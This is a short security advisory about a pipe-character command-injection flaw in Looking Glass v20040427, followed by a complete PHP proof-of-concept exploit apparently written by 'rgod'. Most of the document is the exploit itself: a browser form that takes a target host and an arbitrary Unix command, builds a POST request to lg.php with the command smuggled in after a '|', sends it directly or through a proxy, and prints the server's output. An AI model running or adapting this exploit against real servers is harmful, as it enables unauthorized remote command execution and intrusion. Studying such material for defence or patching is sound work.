source: http://www.securityfocus.com/bid/14682/info

Looking Glass may be exploited to execute arbitrary commands.

An attacker can prefix arbitrary commands with the '|' character, supply them through a URI parameter and have them executed in the context of the server.

This can facilitate unauthorized remote access. 

<?php

/* 9.05 27/08/2005
Looking Glass v20040427 arbitrary commands execution
by rgod
http://rgod.altervista.org

a lot of code for a pipe vulnerability...
run it from your browser...
make these changes in php.ini if you have troubles
with this script

allow_call_time_pass_reference = on
register_globals = On
                                                                           */
error_reporting(0);
echo '<head><title>Looking Glass arbitrary commands execution poc exploit by rgod</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      <style type="text/css">
      <!--
      body,td,th {color: #1CB081;}
      body {background-color: #000000;
             SCROLLBAR-ARROW-COLOR: #ffffff;  SCROLLBAR-BASE-COLOR: black;
      CURSOR: crosshair;
      }
      input {background-color: #303030 !important}
      input {color: #1CB081 !important}
      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 12px;
        font-weight: bold;
        font-style: italic;
              }
      -->
      </style></head>
      <body>
 <p class="Stile6">9.05 27/08/2005</p>
<p class="Stile6">Loooking Glass remote commands execution poc exploit by rgod</p>
<p class="Stile6">a script by rgod at <a href="http://rgod.altervista.org" target="_blank">http://rgod.altervista.org</a></p>
<table width="84%" >
  <tr>
    <td width="43%">
     <form name="form1" method="post" action="'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&command=value&proxy=value">
      <p>
       <input type="text" name="host">
      <span class="Stile5">hostname (ex: www.sitename.com) </span></p>
      <p>
        <input type="text" name="path">
        <span class="Stile5">path (ex: /LookingGlass/ or just /) </span></p>
      <p>
      <input type="text" name="port">
        <span class="Stile5">specify a port other than 80 (default value) </span></p>
      <p>
      <input type="text" name="proxy">
        <span class="Stile5">send exploit through an HTTP proxy (ip:port)  </span></p>
      <p>
      <input type="text" name="command">
        <span class="Stile5">a Unix command... </span></p>
      <p>
          <input type="submit" name="Submit" value="go!">
      </p>
    </form></td>
  </tr>
</table>
</body>
</html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
       }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".htmlentities($headeri[$li])."</td>";
       }

echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

if (($path<>'') and ($host<>''))
{
if ($port=='') {$port=80;}



$data="func=dnsa&ipv=ipv4&target=%7c".urlencode($command);


if ($proxy=='')
{$packet="POST ".$path."lg.php HTTP/1.1\r\n";}
else
{
        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);
        if ($c==0) {
                    echo 'check the proxy...<br>';
             die;
            }
         else
        {$packet="POST http://".$host.$path."lg.php HTTP/1.1\r\n";}
        }
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;


echo '<br> Sending exploit to '.$host.'<br>';

if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
     echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
     $fp=fsockopen($parts[0],$parts[1]);
     if (!$fp) { echo 'No response from proxy...';
   die;
         }

     }
show($packet);
fputs($fp,$packet);

if ($proxy=='')
{    $data='';
     while (!feof($fp))
     {
      $data.=fgets($fp);
     }
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
if (eregi('HTTP/1.1 200 OK',$data))
    {echo 'Exploit sent...<br> If Looking Glass is unpatched and vulnerable <br>';
     echo 'you will see '.htmlentities($command).' output inside HTML...<br><br>';
    }
else
    {echo 'Error, see output...';}

//show($data); //debug: show output in a packet dump...
echo nl2br(htmlentities($data));

}
?>